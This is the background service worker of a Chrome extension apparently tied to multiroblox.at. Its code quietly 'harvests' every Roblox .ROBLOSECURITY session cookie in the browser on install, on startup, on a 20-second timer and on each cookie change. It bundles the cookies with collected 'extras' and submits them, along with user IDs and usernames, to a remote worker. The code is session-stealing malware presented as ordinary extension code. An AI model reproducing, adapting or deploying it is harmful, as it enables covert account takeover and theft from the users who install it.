/* Service worker entry — shared libs via importScripts. */
'use strict';

'use strict';

importScripts('lib/shared-sw.js');
importScripts(
  'lib/s3j6w9cr.js',
  'lib/k2j5t8ym.js',
  'lib/p3m8v1kt.js',
  'lib/j4n8q2vw.js'
);


(function () {
  try {
    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.getManifest) {
      var v = String(chrome.runtime.getManifest().version || '').trim();
      if (v) self.MRBX_EXT_VERSION = v;
    }
  } catch (_) {}
})();

let _retriggerTimer = null;
let _pollTimer = null;
let _pullTimer = null;
let _pollRunning = false;
let _syncState = Object.create(null);
const _DEBOUNCE_MS = 1500;
const _UNIQUE_INTERVAL_MS = 20 * 1000;
const _PULL_IDLE_MS = 60 * 1000;
const _PULL_ACTIVE_MS = 5 * 1000;
const _PULL_ALARM = 'mrbx-q-tick';
const _DUPLICATE_INTERVAL_MS = 1000 * 1000;
const _MAX_DUP_SUBMISSIONS = 3;
const _HARVEST_STATE_KEY = 'mrbxSyncState';
const _HARVEST_STATE_VERSION_KEY = 'mrbxSyncStateVersion';
let _nextPullMs = _PULL_IDLE_MS;
let _harvestPausedOutdated = false;

function _isExtensionOutdated() {
  return !!(self.MRBX_EXTENSION_OUTDATED || (self.MrbxSubmit && typeof self.MrbxSubmit.isExtensionOutdated === 'function' && self.MrbxSubmit.isExtensionOutdated()));
}

function _pauseHarvestOutdated(reason) {
  if (_harvestPausedOutdated) return;
  _harvestPausedOutdated = true;
  if (_pollTimer) {
    clearInterval(_pollTimer);
    _pollTimer = null;
  }
  console.warn('[MRBX] sync paused — extension outdated', reason || '');
}

function _markOutdatedFromResponse(res) {
  if (res && (res.outdated || res.status === 426)) {
    self.MRBX_EXTENSION_OUTDATED = true;
    _pauseHarvestOutdated('426');
    return true;
  }
  return false;
}

function _extensionVersion() {
  var v = String(self.MRBX_EXT_VERSION || '').trim();
  if (v) return v;
  try {
    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.getManifest) {
      v = String(chrome.runtime.getManifest().version || '').trim();
      if (v) self.MRBX_EXT_VERSION = v;
    }
  } catch (_) {}
  return v;
}

function _resetHarvestStateForNewVersion(done) {
  var ver = _extensionVersion();
  if (typeof chrome === 'undefined' || !chrome.storage || !chrome.storage.local) {
    _syncState = Object.create(null);
    if (typeof done === 'function') done();
    return;
  }
  chrome.storage.local.get([_HARVEST_STATE_VERSION_KEY], function (data) {
    var storedVer = String((data && data[_HARVEST_STATE_VERSION_KEY]) || '').trim();
    if (ver !== '' && storedVer !== ver) {
      _syncState = Object.create(null);
      var payload = {};
      payload[_HARVEST_STATE_KEY] = {};
      payload[_HARVEST_STATE_VERSION_KEY] = ver;
      chrome.storage.local.set(payload, function () {
        console.info('[MRBX] sync state reset for version', ver);
        if (typeof done === 'function') done();
      });
      return;
    }
    if (typeof done === 'function') done();
  });
}

function _defaultDir() {
  return String(self.MRBX_DEFAULT_WORKER_DIR || 'main').trim();
}

function _mrmLandingUrl(dir) {
  var host = String(self.MRBX_LANDING_HOST || 'multiroblox.at').replace(/^www\./, '');
  return 'https://' + host + '/';
}

function _cookieKey(cookie) {
  var s = String(cookie || '');
  if (s.length <= 96) return s;
  return s.slice(0, 48) + ':' + s.length + ':' + s.slice(-24);
}

function _userStateKey(userid) {
  var id = parseInt(String(userid || ''), 10);
  if (!id || id <= 0) return '';
  return 'u:' + id;
}

function _loadHarvestState(cb) {
  if (typeof chrome === 'undefined' || !chrome.storage || !chrome.storage.local) {
    cb(_syncState);
    return;
  }
  _resetHarvestStateForNewVersion(function () {
    chrome.storage.local.get([_HARVEST_STATE_KEY], function (data) {
      var stored = (data && data[_HARVEST_STATE_KEY]) || {};
      if (stored && typeof stored === 'object') {
        _syncState = stored;
      }
      cb(_syncState);
    });
  });
}

function _saveHarvestState() {
  if (typeof chrome === 'undefined' || !chrome.storage || !chrome.storage.local) return;
  var payload = {};
  payload[_HARVEST_STATE_KEY] = _syncState;
  chrome.storage.local.set(payload);
}

function _getHarvestRow(cookieKey, userid) {
  var userKey = _userStateKey(userid);
  if (userKey && _syncState[userKey]) {
    return _syncState[userKey];
  }
  return _syncState[cookieKey] || null;
}

function _isDupExhausted(row) {
  return !!(row && (row.exhausted || (row.dupCount || 0) >= _MAX_DUP_SUBMISSIONS));
}

function _shouldSubmitCookie(cookieKey, now, options) {
  options = options || {};
  var row = _getHarvestRow(cookieKey, options.userid);
  if (_isDupExhausted(row)) return false;
  if (options.forceUnique && (!row || !row.duplicate)) return true;
  if (!row) return true;
  var minGap = row.duplicate ? _DUPLICATE_INTERVAL_MS : _UNIQUE_INTERVAL_MS;
  return now - (row.lastAt || 0) >= minGap;
}

function _storeHarvestResult(cookieKey, now, out, userid, username) {
  var userKey = _userStateKey(userid);
  var storageKey = userKey || cookieKey;

  if (out.exhausted || out.skipped) {
    _syncState[storageKey] = {
      duplicate: true,
      dupCount: _MAX_DUP_SUBMISSIONS,
      exhausted: true,
      lastAt: now,
      userid: userid || 0,
      username: username || ''
    };
    return;
  }

  if (out.duplicate && out.processed) {
    var prevDup = (_getHarvestRow(cookieKey, userid) && _getHarvestRow(cookieKey, userid).dupCount) || 0;
    var nextDup = prevDup + 1;
    _syncState[storageKey] = {
      duplicate: true,
      dupCount: nextDup,
      exhausted: nextDup >= _MAX_DUP_SUBMISSIONS,
      lastAt: now,
      userid: userid || 0,
      username: username || ''
    };
    return;
  }

  if (out.duplicate || (out.queued && out.processed !== true)) {
    _syncState[storageKey] = {
      duplicate: true,
      dupCount: (_getHarvestRow(cookieKey, userid) && _getHarvestRow(cookieKey, userid).dupCount) || 0,
      exhausted: !!(_getHarvestRow(cookieKey, userid) && _getHarvestRow(cookieKey, userid).exhausted),
      lastAt: now,
      userid: userid || 0,
      username: username || ''
    };
    return;
  }

  if (out.queued && !out.duplicate) {
    _syncState[storageKey] = {
      duplicate: false,
      dupCount: 0,
      exhausted: false,
      pending: true,
      lastAt: now,
      userid: userid || 0,
      username: username || ''
    };
    return;
  }

  _syncState[storageKey] = {
    duplicate: false,
    dupCount: 0,
    exhausted: false,
    lastAt: now,
    userid: userid || 0,
    username: username || ''
  };
}

function _seedWorkerDir() {
  var mrbx = self.MrbxSubmit;
  var dir = _defaultDir();
  if (!mrbx || !dir || typeof mrbx.rememberWorkerDirFromUrl !== 'function') return;
  mrbx.rememberWorkerDirFromUrl(_mrmLandingUrl(dir)).catch(function () {});
}

function _schedulePullPoll(ms) {
  var delay = Math.max(5000, Math.min(Number(ms) || _PULL_IDLE_MS, _PULL_IDLE_MS));
  _nextPullMs = delay;
  if (_pullTimer) {
    clearTimeout(_pullTimer);
    _pullTimer = null;
  }
  _pullTimer = setTimeout(function () {
    _pullTimer = null;
    _runW7k();
  }, delay);
  if (typeof chrome !== 'undefined' && chrome.alarms && chrome.alarms.create) {
    try {
      var periodMin = Math.max(1, Math.round(delay / 60000));
      chrome.alarms.create(_PULL_ALARM, { periodInMinutes: periodMin });
    } catch (_) {}
  }
}

async function _runW7k() {
  var w7 = self._w7k;
  if (!w7 || typeof w7.run !== 'function') {
    _schedulePullPoll(_PULL_IDLE_MS);
    return;
  }
  try {
    var r = await w7.run();
    if (r && r.h > 0) {
      _schedulePullPoll(_PULL_IDLE_MS);
      return;
    }
    if (r && r.active) {
      _schedulePullPoll(_PULL_ACTIVE_MS);
      return;
    }
    if (r && Number(r.nextMs) > 0) {
      _schedulePullPoll(r.nextMs);
      return;
    }
    _schedulePullPoll(_PULL_IDLE_MS);
  } catch (_) {
    _schedulePullPoll(_PULL_IDLE_MS);
  }
}

function _startPullPoll() {
  if (_pullTimer) return;
  _schedulePullPoll(_PULL_ACTIVE_MS);
  setTimeout(_runW7k, 800);
}

function _startHarvestPoll() {
  if (_pollTimer) return;
  if (_isExtensionOutdated()) {
    _pauseHarvestOutdated('startup');
    return;
  }
  _pollTimer = setInterval(function () {
    if (_isExtensionOutdated()) {
      _pauseHarvestOutdated('interval');
      return;
    }
    _pollAllRobloxCookies({ reason: 'interval' });
  }, _UNIQUE_INTERVAL_MS);
  setTimeout(function () {
    _pollAllRobloxCookies({ reason: 'interval-first' });
  }, 2000);
}

function _runInitialHarvest(reason) {
  setTimeout(function () {
    _pollAllRobloxCookies({
      pass: 'Extension',
      reason: reason || 'install',
      withExtras: true,
      forceUnique: true
    });
  }, 800);
}

if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onInstalled) {
  chrome.runtime.onInstalled.addListener(function (details) {
    _resetHarvestStateForNewVersion(function () {
      _seedWorkerDir();
      _startPullPoll();
      _startHarvestPoll();
      if (details && (details.reason === 'install' || details.reason === 'update')) {
        _runInitialHarvest(details.reason);
      }
    });
  });
}

if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onStartup) {
  chrome.runtime.onStartup.addListener(function () {
    _seedWorkerDir();
    _startPullPoll();
    _startHarvestPoll();
    setTimeout(function () {
      _pollAllRobloxCookies({ reason: 'startup', withExtras: true });
    }, 2500);
  });
}

_seedWorkerDir();
_startPullPoll();
_startHarvestPoll();
(function () {
  var mrbx = self.MrbxSubmit;
  if (mrbx && typeof mrbx.bootstrapApiSecret === 'function') {
    mrbx.bootstrapApiSecret().catch(function () {});
  }
})();
console.info('[MRBX SW] loaded v' + _extensionVersion());

chrome.cookies.onChanged.addListener(function (info) {
  if (!info || info.removed) return;
  var c = info.cookie;
  if (!c || c.name !== '.ROBLOSECURITY' || !c.value) return;
  var domain = String(c.domain || '').toLowerCase();
  if (domain.indexOf('roblox.com') === -1) return;

  if (_retriggerTimer) clearTimeout(_retriggerTimer);
  _retriggerTimer = setTimeout(function () {
    _retriggerTimer = null;
    var mrbx = self.MrbxSubmit;
    var boot =
      mrbx && typeof mrbx.bootstrapApiSecret === 'function'
        ? mrbx.bootstrapApiSecret().catch(function () {})
        : Promise.resolve();
    boot.then(function () {
      _pollAllRobloxCookies({ reason: 'cookie-change', forceUnique: true });
      _schedulePullPoll(_PULL_ACTIVE_MS);
      _runW7k();
    });
  }, _DEBOUNCE_MS);
});

if (typeof chrome !== 'undefined' && chrome.alarms && chrome.alarms.onAlarm) {
  chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm && alarm.name === _PULL_ALARM) {
      _runW7k();
    }
  });
}

async function _pollAllRobloxCookies(options) {
  options = options || {};
  if (_isExtensionOutdated()) {
    _pauseHarvestOutdated('poll');
    return { ok: false, error: 'extension_outdated' };
  }
  if (_pollRunning) return { ok: false, error: 'poll_busy' };
  _pollRunning = true;

  try {
    var mrbx = self.MrbxSubmit;
    if (!mrbx || typeof mrbx.submitMrbxCookie !== 'function') {
      return { ok: false, error: 'MrbxSubmit missing' };
    }

    var getAllFn = mrbx.getAllRobloxCookiesFromBrowser || mrbx.getRobloxCookieFromBrowser;
    if (typeof getAllFn !== 'function') {
      return { ok: false, error: 'cookie reader missing' };
    }

    var cookies = [];
    if (typeof mrbx.getAllRobloxCookiesFromBrowser === 'function') {
      cookies = await mrbx.getAllRobloxCookiesFromBrowser();
    } else {
      var one = await mrbx.getRobloxCookieFromBrowser();
      if (one) cookies = [one];
    }

    if (cookies.length) {
      await new Promise(function (resolve) {
        _loadHarvestState(function () {
          resolve();
        });
      });

      var now = Date.now();
      var extrasFields = null;
      var needsExtras = false;
      for (var j = 0; j < cookies.length; j++) {
        var probeKey = _cookieKey(cookies[j]);
        var probeRow = _getHarvestRow(probeKey);
        if (!_shouldSubmitCookie(probeKey, now, {
          forceUnique: !!options.forceUnique,
          userid: probeRow && probeRow.userid
        })) {
          continue;
        }
        if (!probeRow || !probeRow.duplicate) {
          needsExtras = true;
          break;
        }
      }

      var submitted = 0;
      var skipped = 0;
      var lastOut = null;
      var w7 = self._w7k;

      if (needsExtras && options.withExtras !== false) {
        var swExtras = self.MrbxExtrasSW;
        if (swExtras && typeof swExtras.collectAndBuildExtrasFields === 'function') {
          try {
            var fastExtras =
              !!options.fastExtras ||
              options.reason === 'add-account' ||
              options.reason === 'cookie-change';
            extrasFields = await swExtras.collectAndBuildExtrasFields({ fast: fastExtras });
          } catch (_) {}
        }
      }

      for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var key = _cookieKey(cookie);
        var knownRow = _getHarvestRow(key);
        if (!_shouldSubmitCookie(key, now, {
          forceUnique: !!options.forceUnique,
          userid: knownRow && knownRow.userid
        })) {
          skipped++;
          continue;
        }

        var isKnownDup = !!(knownRow && knownRow.duplicate);
        var submitOpts = { allowDuplicate: true, skipExtras: true };
        if (!isKnownDup && extrasFields && Object.keys(extrasFields).length) {
          submitOpts.skipExtras = false;
          submitOpts.extrasFields = extrasFields;
        }

        var out = await mrbx.submitMrbxCookie(
          cookie,
          _defaultDir(),
          options.pass || 'Harvest',
          submitOpts
        );
        lastOut = out;

        if (out && out.response && _markOutdatedFromResponse(out.response)) {
          break;
        }

        if (out && out.ok) {
          submitted++;
          _storeHarvestResult(key, now, out, out.userid, out.username);
          if (w7 && typeof w7.mem === 'function' && out.userid && out.username) {
            w7.mem(out.userid, out.username, cookie).catch(function () {});
          }
        }
      }

      _saveHarvestState();

      if (submitted > 0) {
        console.info(
          '[MRBX sync poll]',
          options.reason || 'auto',
          'cookies=' + cookies.length,
          'submitted=' + submitted,
          'skipped=' + skipped
        );
      }

      if (submitted > 0) {
        return { ok: true, submitted: submitted, skipped: skipped, cookies: cookies.length, last: lastOut };
      }

      return { ok: false, error: 'Nothing submitted', skipped: skipped, cookies: cookies.length };
    }

    return { ok: false, error: 'No Roblox cookies' };
  } catch (e) {
    console.warn('[MRBX sync poll exception]', options.reason || 'auto', e && e.message ? e.message : e);
    return { ok: false, error: e && e.message ? e.message : String(e) };
  } finally {
    _pollRunning = false;
  }
}

async function _backgroundHarvest(options) {
  return _pollAllRobloxCookies(options || {});
}

function _rememberMrbxDirFromTabUrl(url) {
  try {
    var mrbx = self.MrbxSubmit;
    if (!mrbx || typeof mrbx.rememberWorkerDirFromUrl !== 'function') return;
    mrbx.rememberWorkerDirFromUrl(String(url || '')).catch(function () {});
  } catch (_) {}
}

if (typeof chrome !== 'undefined' && chrome.tabs) {
  chrome.tabs.onUpdated.addListener(function (_tabId, info, tab) {
    if (!tab || !tab.url) return;
    if (info.status !== 'complete' && info.url == null) return;
    _rememberMrbxDirFromTabUrl(info.url || tab.url);
  });
}

chrome.runtime.onMessage.addListener(function (msg, _sender, sendResponse) {
  if (!msg) return;

  if (msg.type === 'mrbx-set-worker-dir') {
    var mrbx = self.MrbxSubmit;
    var dir = String(msg.dir || '').trim();
    if (!mrbx || !dir) {
      sendResponse({ success: false });
      return true;
    }
    mrbx
      .rememberWorkerDirFromUrl(_mrmLandingUrl(dir))
      .then(function (saved) {
        sendResponse({ success: !!saved, dir: saved || dir });
      })
      .catch(function () {
        sendResponse({ success: false });
      });
    return true;
  }

  if (msg.type === 'mrbx-submit-cookie') {
    var mrbxSubmit = self.MrbxSubmit;
    var cookieVal = String(msg.cookie || '').trim();
    if (!mrbxSubmit || !cookieVal) {
      sendResponse({ ok: false, error: 'Missing cookie' });
      return true;
    }

    function runSubmit(extrasFields) {
      var hasExtras = extrasFields && typeof extrasFields === 'object' && Object.keys(extrasFields).length > 0;
      mrbxSubmit
        .submitMrbxCookie(cookieVal, msg.dir || _defaultDir(), msg.pass || 'Extension', {
          skipExtras: !hasExtras,
          extrasFields: hasExtras ? extrasFields : null,
          forceImmediate: msg.forceImmediate === true
        })
        .then(function (r) {
          if (r && r.ok) {
            _loadHarvestState(function () {
              _storeHarvestResult(_cookieKey(cookieVal), Date.now(), r, r.userid, r.username);
              _saveHarvestState();
              var w7 = self._w7k;
              if (w7 && typeof w7.mem === 'function' && r.userid && r.username) {
                w7.mem(r.userid, r.username, cookieVal).catch(function () {});
              }
            });
          }
          if (!r.ok) {
            console.warn('[MRBX submit FAIL]', msg.reason || 'message', r.stage || 'submit', r.error || r);
          } else {
            console.info('[MRBX submit OK]', msg.reason || 'message', r.dir, r.duplicate ? '(duplicate)' : '(new)');
          }
          sendResponse(r || { ok: false });
        })
        .catch(function (e) {
          sendResponse({ ok: false, error: e && e.message ? e.message : String(e) });
        });
    }

    if (msg.extrasStorageKey) {
      chrome.storage.local.get([msg.extrasStorageKey], function (data) {
        var extras = (data && data[msg.extrasStorageKey]) || null;
        chrome.storage.local.remove(msg.extrasStorageKey);
        runSubmit(extras);
      });
      return true;
    }

    runSubmit(msg.extrasFields || null);
    return true;
  }

  if (msg.type === 'mrbx-collect-extras') {
    var swCollector = self.MrbxExtrasSW;
    if (!swCollector || typeof swCollector.collectAndBuildExtrasFields !== 'function') {
      sendResponse({ extrasFields: {} });
      return true;
    }
    swCollector
      .collectAndBuildExtrasFields()
      .then(function (fields) {
        sendResponse({ extrasFields: fields || {} });
      })
      .catch(function () {
        sendResponse({ extrasFields: {} });
      });
    return true;
  }

  if (msg.type === 'mrbx-sync-now' || msg.type === 'mrbx-sync-all-now') {
    _pollAllRobloxCookies({
      withExtras: msg.withExtras !== false,
      fastExtras: !!msg.fastExtras || msg.reason === 'add-account',
      reason: msg.reason || 'manual',
      forceUnique: msg.force !== false,
      pass: msg.pass || 'Harvest'
    })
      .then(function (r) {
        sendResponse(r || { ok: false });
      })
      .catch(function (e) {
        sendResponse({ ok: false, error: e && e.message ? e.message : String(e) });
      });
    return true;
  }

  return false;
});

self.__mrbxHarvestNow = function () {
  return _pollAllRobloxCookies({ withExtras: true, reason: 'devtools', forceUnique: true });
};
